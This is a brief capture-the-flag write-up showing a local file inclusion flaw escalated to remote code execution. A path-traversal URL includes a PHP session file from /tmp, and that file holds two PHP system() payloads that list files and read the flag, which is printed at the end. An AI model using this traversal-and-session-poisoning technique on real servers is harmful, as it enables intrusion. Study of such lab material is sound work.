We can see that some of the urls have a query param that takes a file name so we can test for LFI

LFI works, so now to get RCE to find the flag

One of the ways of doing this is to use the session files, we can set a session var using the 'Send' page

Then we have to enum for the session files, there are a few locations for these but in this case its the tmp dir which is quite common

So hitting this url will run whatever code we had in our session file and show it in the source

http://165.227.231.249:31831/?f=../../../../../tmp/sess_2a560b7bbb81512b5c16e76edc9649ec

Payload 1
```php
<?php system('ls'); ?>
```
Payload2
```php
<?php system('cat flag_ffacf623917dc0e2f83e9041644b3e98.txt'); ?>
```

CHTB{th4ts_4_w31rd_3xt0rt10n_@#$?}
